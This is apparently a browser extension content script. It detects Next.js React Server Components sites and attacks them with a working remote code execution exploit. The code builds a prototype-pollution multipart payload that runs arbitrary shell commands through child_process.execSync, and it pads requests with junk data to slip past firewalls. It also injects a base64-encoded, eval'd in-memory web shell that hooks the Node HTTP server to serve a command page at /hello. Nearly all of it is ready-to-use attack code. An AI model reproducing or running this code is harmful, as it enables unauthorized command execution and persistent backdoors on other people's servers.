// content.js

// === 1. 被动检测 ===
function performPassiveScan() {
    let score = 0;
    let details = [];
    const html = document.documentElement.outerHTML;

    if (document.contentType === "text/x-component") {
        score += 100;
        details.push("Found: Content-Type text/x-component");
    }
    if (/(window|self)\.__next_f\s*=/.test(html)) {
        score += 80;
        details.push("Found: window.__next_f (App Router)");
    }
    if (html.includes("react-server-dom-webpack")) {
        score += 30;
        details.push("Found: react-server-dom-webpack");
    }
    return { isRSC: score >= 50, details: details };
}

// === 2. 主动指纹 ===
async function performFingerprint() {
    try {
        const res = await fetch(window.location.href, {
            method: 'GET',
            headers: { 'RSC': '1' }
        });
        
        let details = [];
        const cType = res.headers.get('Content-Type') || "";
        const vary = res.headers.get('Vary') || "";
        const text = await res.text();

        if (cType.includes('text/x-component')) details.push("Response Content-Type became text/x-component");
        if (vary.includes('RSC')) details.push("Vary header contains 'RSC'");
        if (/^\d+:["IHL]/.test(text)) details.push("Body structure matches React Flight Protocol");

        return { detected: details.length > 0, details: details };
    } catch (e) {
        return { detected: false, details: ["Network Error"] };
    }
}

// === WAF Bypass: Junk Data Generation ===
function generateJunkData(sizeBytes) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let paramName = '';
    let junk = '';
    
    // Generate random param name (12 chars lowercase)
    for (let i = 0; i < 12; i++) {
        paramName += 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)];
    }
    
    // Generate junk data
    for (let i = 0; i < sizeBytes; i++) {
        junk += chars[Math.floor(Math.random() * chars.length)];
    }
    
    return { paramName, junk };
}

// === Memory Shell Deployment ===
async function deployMemoryShell(wafEnabled) {
    try {
        // Get current path from URL
        const currentPath = window.location.pathname || '/en';
        const targetUrl = new URL(currentPath, window.location.href).href;
        
        const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
        
        // WAF bypass kontrolü - STRICT: sadece tam olarak true ise junk data ekle
        const shouldAddJunkData = wafEnabled === true && typeof wafEnabled === 'boolean';
        console.log('[Memory Shell] Received wafEnabled:', wafEnabled, 'Type:', typeof wafEnabled);
        console.log('[Memory Shell] Will add junk data:', shouldAddJunkData);
        
        // Memory shell code - webshell style with HTML interface
        // Note: shell: true enables shell operators like &&, |, ; etc.
        const memoryShellCode = `(async()=>{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const o=http.Server.prototype.emit;http.Server.prototype.emit=function(e,...a){if(e==='request'){const[r,s]=a;const p=url.parse(r.url,true);if(p.pathname==='/hello'){const cmd=p.query.cmd||'';let html='<!DOCTYPE html><html><head><meta charset="UTF-8"><title>WebShell</title><style>body{font-family:monospace;background:#1e1e1e;color:#d4d4d4;padding:20px;max-width:1200px;margin:0 auto;}h1{color:#4ec9b0;border-bottom:2px solid #4ec9b0;padding-bottom:10px;}form{margin:20px 0;background:#252526;padding:15px;border-radius:5px;}input[type="text"]{width:70%;padding:8px;background:#3c3c3c;border:1px solid #555;color:#d4d4d4;font-size:14px;}input[type="submit"]{width:25%;padding:8px;background:#0e639c;border:none;color:#fff;cursor:pointer;font-size:14px;margin-left:10px;}input[type="submit"]:hover{background:#1177bb;}pre{background:#252526;padding:15px;border-radius:5px;overflow-x:auto;border:1px solid #555;white-space:pre-wrap;word-wrap:break-word;}a{color:#4ec9b0;text-decoration:none;}a:hover{text-decoration:underline;}.info{background:#252526;padding:10px;border-radius:5px;margin-top:20px;font-size:12px;color:#858585;border-left:3px solid #4ec9b0;}code{color:#4ec9b0;background:#1e1e1e;padding:2px 6px;border-radius:3px;}</style></head><body><h1>WebShell</h1><form method="GET" action="/hello"><input type="text" name="cmd" value="'+(cmd?cmd.replace(/"/g,'&quot;').replace(/'/g,'&#39;'):'')+'" placeholder="Enter command (e.g., ls -la, cd /home && ls)"><input type="submit" value="Execute"></form>';let currentDir='';if(cmd){try{const result=cp.execSync(cmd,{encoding:'utf8',stdio:'pipe',shell:true});html+='<h2>Output:</h2><pre>'+result.replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/&/g,'&amp;')+'</pre>';}catch(err){html+='<h2>Error:</h2><pre style="color:#f48771;">'+err.message.replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/&/g,'&amp;')+'</pre>';}try{currentDir=cp.execSync('pwd',{encoding:'utf8',stdio:'pipe',shell:true}).trim();}catch(e){currentDir=process.cwd();}}else{currentDir=process.cwd();}html+='<div class="info"><a href="/hello">Clear</a> | <strong>Current Directory:</strong> <code>'+currentDir.replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</code></div></body></html>';s.writeHead(200,{'Content-Type':'text/html;charset=utf-8'});s.end(html);return true;}}return o.apply(this,arguments);};})();`;
        
        // Encode memory shell code to base64
        const memoryShellBase64 = btoa(unescape(encodeURIComponent(memoryShellCode)));
        
        // Create payload that decodes base64 and executes the memory shell
        // Format matches the working base64 command execution example
        const prefixPayload = `var shellCode=Buffer.from('${memoryShellBase64}','base64').toString('utf8');eval(shellCode);var res='Memory shell deployed at /hello';throw Object.assign(new Error('x'),{digest: Buffer.from(res).toString('base64')});`;
        
        // Build the payload with proper JSON structure matching the working example
        const part0 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"${prefixPayload}","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
        
        // Build multipart form data
        const parts = [];
        
        // WAF bypass: Add junk data part first (ONLY if wafEnabled is true)
        if (shouldAddJunkData) {
            const wafBypassSizeKb = 128;
            const { paramName, junk } = generateJunkData(wafBypassSizeKb * 1024);
            parts.push(
                `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
                `Content-Disposition: form-data; name="${paramName}"\r\n\r\n` +
                `${junk}\r\n`
            );
        }
        
        // Add part0
        parts.push(
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="0"\r\n\r\n` +
            `${part0}\r\n`
        );
        
        // Add part1
        parts.push(
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="1"\r\n\r\n` +
            `"$@0"\r\n`
        );
        
        // Add part2
        parts.push(
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="2"\r\n\r\n` +
            `[]\r\n`
        );
        
        // Add closing boundary
        parts.push(`------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`);
        
        const bodyParts = parts.join('');
        
        console.log('[Content] Deploying memory shell to:', targetUrl);
        
        // Make request using XMLHttpRequest - stealth mode with normal browser headers
        const makeRequest = (url) => {
            return new Promise((resolve, reject) => {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', url, true);
                
                // Normal browser headers (only safe headers that can be set manually)
                // Note: Accept-Encoding, Referer, Origin, Sec-Fetch-* are browser-controlled and cannot be set
                xhr.setRequestHeader('Accept', '*/*');
                xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
                
                // Next.js specific headers (required for RSC)
                xhr.setRequestHeader('Next-Action', 'x');
                xhr.setRequestHeader('X-Nextjs-Request-Id', 'b5dce965');
                xhr.setRequestHeader('X-Nextjs-Html-Request-Id', 'SSTMXm7OJ_g0Ncx6jpQt9');
                xhr.setRequestHeader('Content-Type', `multipart/form-data; boundary=${boundary}`);
                
                xhr.onload = () => {
                    resolve({
                        status: xhr.status,
                        statusText: xhr.statusText,
                        responseText: xhr.responseText,
                        getAllResponseHeaders: () => xhr.getAllResponseHeaders(),
                        getResponseHeader: (name) => xhr.getResponseHeader(name)
                    });
                };
                
                xhr.onerror = () => {
                    reject(new Error('Network request failed'));
                };
                
                xhr.send(bodyParts);
            });
        };
        
        let res = await makeRequest(targetUrl);
        const statusCode = res.status;
        const responseText = res.responseText || '';
        
        console.log('[Content] Memory shell response status:', statusCode);
        console.log('[Content] Memory shell response text length:', responseText.length);
        console.log('[Content] Memory shell response text:', responseText);
        
        // Parse response to check for digest (indicates payload execution)
        // Response format: 1:E{"digest":"base64string"}
        // Try multiple patterns to find digest
        let digestMatch = responseText.match(/"digest"\s*:\s*"([^"]+)"/);
        if (!digestMatch) {
            // Try with escaped quotes
            digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);
        }
        
        if (digestMatch && digestMatch[1]) {
            try {
                // Decode base64 digest
                let rawBase64 = digestMatch[1];
                console.log('[Content] Raw digest base64:', rawBase64);
                
                // Handle JSON string escape sequences if needed
                let cleanBase64 = rawBase64;
                try {
                    cleanBase64 = JSON.parse(`"${rawBase64}"`);
                } catch (e) {
                    // If JSON parse fails, use raw value
                    cleanBase64 = rawBase64;
                }
                
                // Decode base64 to string
                const decodedStr = new TextDecoder().decode(
                    Uint8Array.from(atob(cleanBase64), c => c.charCodeAt(0))
                );
                
                console.log('[Content] Memory shell deployment response (decoded):', decodedStr);
                
                // If we get a digest response, the payload was executed
                // The memory shell should be deployed at /hello
                const shellPath = '/hello';
                const shellUrl = new URL(shellPath, window.location.origin).href;
                
                return {
                    success: true,
                    shellPath: shellPath,
                    fullUrl: shellUrl,
                    statusCode: statusCode,
                    message: decodedStr
                };
            } catch (parseError) {
                console.log('[Content] Failed to parse digest:', parseError);
                console.log('[Content] Error details:', parseError.message);
                console.log('[Content] Raw digest value:', digestMatch[1]);
            }
        } else {
            console.log('[Content] No digest found in response');
        }
        
        // Check for success - memory shell is deployed if request succeeds
        // The shell will be available at /hello?cmd=<command>
        // Note: Even 500 errors might indicate the shell was deployed (error during execution)
        if (statusCode >= 200 && statusCode < 300) {
            const shellPath = '/hello';
            const shellUrl = new URL(shellPath, window.location.origin).href;
            
            return {
                success: true,
                shellPath: shellPath,
                fullUrl: shellUrl,
                statusCode: statusCode
            };
        } else if (statusCode === 500) {
            // 500 error might still mean the shell was deployed
            // The error could be from the payload execution itself
            const shellPath = '/hello';
            const shellUrl = new URL(shellPath, window.location.origin).href;
            
            return {
                success: true,
                shellPath: shellPath,
                fullUrl: shellUrl,
                statusCode: statusCode,
                note: 'Deployed (500 error may indicate payload execution)'
            };
        } else {
            return {
                success: false,
                msg: `Memory shell deployment failed. Status: ${statusCode}. Response: ${responseText.substring(0, 200)}`,
                statusCode: statusCode
            };
        }
        
    } catch (e) {
        console.log('[Content] Memory shell deployment error:', e);
        return {
            success: false,
            msg: "Network/Request Error: " + e.message
        };
    }
}

// === 3. RCE 漏洞利用 ===
async function performExploit(cmd, wafEnabled) {
    // 默认命令
    const targetCmd = cmd || "echo vulnerability_test";
    
    // WAF bypass kontrolü - STRICT: sadece tam olarak true ise junk data ekle
    // wafEnabled: undefined, null, false, 0, "", vs. -> junk data EKLEME
    // wafEnabled: sadece true -> junk data EKLE
    const shouldAddJunkData = wafEnabled === true && typeof wafEnabled === 'boolean';
    console.log('[RSC Exploit] Received wafEnabled:', wafEnabled, 'Type:', typeof wafEnabled);
    console.log('[RSC Exploit] Will add junk data:', shouldAddJunkData);
    
    // 构造 Payload，动态插入命令
    // Prefix payload (command execution)
    const prefixPayload = `var res=process.mainModule.require('child_process').execSync('${targetCmd}').toString('base64');throw Object.assign(new Error('x'),{digest: res});`;
    
    // Part0 structure (matching Python version, excluding prefix_payload from template)
    const part0 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"${prefixPayload}","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
    
    const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
    
    // Build multipart form data
    const parts = [];
    
    // WAF bypass: Add junk data part first (ONLY if wafEnabled is true)
    if (shouldAddJunkData) {
        const wafBypassSizeKb = 128;
        const { paramName, junk } = generateJunkData(wafBypassSizeKb * 1024);
        parts.push(
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="${paramName}"\r\n\r\n` +
            `${junk}\r\n`
        );
    }
    
    // Add part0
    parts.push(
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="0"\r\n\r\n` +
        `${part0}\r\n`
    );
    
    // Add part1
    parts.push(
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="1"\r\n\r\n` +
        `"$@0"\r\n`
    );
    
    // Add part2
    parts.push(
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="2"\r\n\r\n` +
        `[]\r\n`
    );
    
    // Add closing boundary
    parts.push(`------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`);
    
    const bodyParts = parts.join('');

    // Convert relative URL to absolute URL for Firefox compatibility
    let targetUrl = new URL("/adfa", window.location.href).href;

    // Store request data for saving
    lastRequestData = {
        url: targetUrl,
        boundary: boundary,
        body: bodyParts,
        bodyLength: bodyParts.length
    };

    let statusCode = null;
    let pageTitle = '-';
    let responseText = '';
    
    try {
        // Use XMLHttpRequest for better network tab visibility in Firefox
        console.log('[Content] Sending exploit request to:', targetUrl);
        
        // Helper function to make XHR request - stealth mode with normal browser headers
        const makeRequest = (url) => {
            return new Promise((resolve, reject) => {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', url, true);
                
                // Normal browser headers (only safe headers that can be set manually)
                // Note: Accept-Encoding, Referer, Origin, Sec-Fetch-* are browser-controlled and cannot be set
                xhr.setRequestHeader('Accept', '*/*');
                xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
                
                // Next.js specific headers (required for RSC)
                xhr.setRequestHeader('Next-Action', 'x');
                xhr.setRequestHeader('X-Nextjs-Request-Id', 'b5dce965');
                xhr.setRequestHeader('X-Nextjs-Html-Request-Id', 'SSTMXm7OJ_g0Ncx6jpQt9');
                xhr.setRequestHeader('Content-Type', `multipart/form-data; boundary=${boundary}`);
                
                xhr.onload = () => {
                    resolve({
                        status: xhr.status,
                        statusText: xhr.statusText,
                        responseText: xhr.responseText,
                        getAllResponseHeaders: () => xhr.getAllResponseHeaders(),
                        getResponseHeader: (name) => xhr.getResponseHeader(name)
                    });
                };
                
                xhr.onerror = () => {
                    reject(new Error('Network request failed'));
                };
                
                xhr.send(bodyParts);
            });
        };
        
        // First request to check for redirects
        let res = await makeRequest(targetUrl);
        statusCode = res.status;
        console.log('[Content] Initial response status:', statusCode);
        
        // Check if response is a redirect (3xx status codes)
        if (statusCode >= 300 && statusCode < 400) {
            // Get redirect location
            const locationHeader = res.getResponseHeader('Location') || res.getResponseHeader('location');
            if (locationHeader) {
                // Resolve relative redirect URL to absolute
                const redirectUrl = new URL(locationHeader, targetUrl).href;
                console.log('[Content] Redirect detected to:', redirectUrl);
                
                // Retry exploit on the redirect URL
                targetUrl = redirectUrl;
                // Update stored request data with redirect URL
                lastRequestData.url = targetUrl;
                res = await makeRequest(targetUrl);
                statusCode = res.status;
                console.log('[Content] Retry on redirect URL, new status:', statusCode);
            }
        }
        
        // Get response text
        responseText = res.responseText || '';
        console.log('[Content] Response text length:', responseText.length);
        
        // Extract title from response HTML
        try {
            if (responseText) {
                const titleMatch = responseText.match(/<title[^>]*>([^<]+)<\/title>/i);
                if (titleMatch && titleMatch[1]) {
                    pageTitle = titleMatch[1].trim();
                }
            }
            // If no title found in response, try document
            if (pageTitle === '-' && typeof document !== 'undefined' && document.title) {
                pageTitle = document.title;
            }
        } catch (e) {
            // Title extraction failed, keep default
            console.log('[Content] Title extraction error:', e);
        }
        
        console.log('[Content] Extracted title:', pageTitle);

        // 正则提取 digest 的值
        const digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);

        if (digestMatch && digestMatch[1]) {
            let rawBase64 = digestMatch[1];
            
            try {
                // --- 修改点 2：解码逻辑 ---
                
                // 1. 先处理 JSON 字符串转义 (比如把 \" 变回 ")
                let cleanBase64 = JSON.parse(`"${rawBase64}"`);
                
                // 2. Base64 解码
                // atob() 可以解码 Base64，但如果包含中文可能会乱码
                // 使用 TextDecoder 组合拳可以完美支持 UTF-8 中文
                const decodedStr = new TextDecoder().decode(
                    Uint8Array.from(atob(cleanBase64), c => c.charCodeAt(0))
                );

                const result = { 
                    success: true, 
                    output: decodedStr,
                    statusCode: statusCode,
                    title: pageTitle,
                    requestData: lastRequestData // Include request data in response
                };
                console.log('[Content] Returning success result:', result);
                return result;
            } catch (parseError) {
                return { 
                    success: false, 
                    msg: "Decoding Error: " + parseError.message, 
                    debug: rawBase64,
                    statusCode: statusCode,
                    title: pageTitle,
                    requestData: lastRequestData // Include request data even on error
                };
            }
        } else {
            // No digest found - but we still have status code
            return { 
                success: false, 
                msg: "Exploit Failed: 'digest' key not found.",
                debug: responseText ? responseText.substring(0, 100) : 'No response text',
                statusCode: statusCode,
                title: pageTitle,
                requestData: lastRequestData // Include request data even on error
            };
        }

    } catch (e) {
        // Network error durumunda - ama eğer response varsa status code'u döndür
        console.log('[Content] Fetch error:', e);
        return { 
            success: false, 
            msg: "Network/Request Error: " + e.message,
            statusCode: statusCode || null,
            title: pageTitle || '-',
            requestData: lastRequestData // Include request data even on error
        };
    }
}

// === 消息监听与初始化 ===
// Use browser API for Firefox compatibility
const browserAPI = typeof browser !== 'undefined' ? browser : chrome;

// Store last request data for saving
let lastRequestData = null;

const passiveData = performPassiveScan();
if(passiveData.isRSC) browserAPI.runtime.sendMessage({ action: "update_badge" });

browserAPI.runtime.onMessage.addListener((req, sender, sendResponse) => {
    if (req.action === "get_passive") sendResponse(passiveData);
    if (req.action === "run_fingerprint") {
        performFingerprint().then(res => sendResponse(res));
        return true;
    }
    if (req.action === "run_exploit") {
        // wafEnabled değerini direkt olarak geçir - message'dan gelen değeri olduğu gibi kullan
        console.log('[Content] Received message - wafEnabled:', req.wafEnabled, 'Type:', typeof req.wafEnabled);
        performExploit(req.cmd, req.wafEnabled).then(res => {
            sendResponse(res);
        });
        return true;
    }
    if (req.action === "get_last_request") {
        sendResponse(lastRequestData);
        return false;
    }
    if (req.action === "deploy_memory_shell") {
        // wafEnabled değerini direkt olarak geçir - message'dan gelen değeri olduğu gibi kullan
        console.log('[Content] Received memory shell message - wafEnabled:', req.wafEnabled, 'Type:', typeof req.wafEnabled);
        deployMemoryShell(req.wafEnabled).then(res => {
            sendResponse(res);
        });
        return true;
    }
});
